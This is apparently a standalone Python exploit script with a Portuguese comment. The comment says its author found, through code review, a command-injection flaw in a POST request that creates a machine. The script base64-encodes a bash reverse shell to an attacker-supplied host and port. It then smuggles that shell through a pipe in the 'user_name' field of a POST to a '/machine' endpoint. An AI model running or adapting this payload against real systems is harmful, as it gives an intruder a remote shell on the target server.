"""
By Matheus Lambert
Esse exploit foi desenvolvido para explorar uma
falha em um ambiente e situação específica onde
nessa requisição POST era criado uma máquina e
através de CODE REVIEW pude perceber que era
possível a injeção de códigos na requisição.
"""

import requests
import base64
import argparse

def exploit(host,port):
        first_payload = "bash -i >& /dev/tcp/"+host+"/"+port+" 0>&1"
        final_payload = base64.b64encode(first_payload.encode()).decode()

        data = {
        'user_name': 'matheus123|echo -n "'+final_payload+'"|base64 -d |bash'
        }

        response = requests.post('http://IP/machine', data=data)
        print(response.text)

if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument('--host',help='host',required=True)
        parser.add_argument('--port',help='port',required=True)
        args = parser.parse_args()
        exploit(args.host, args.port)
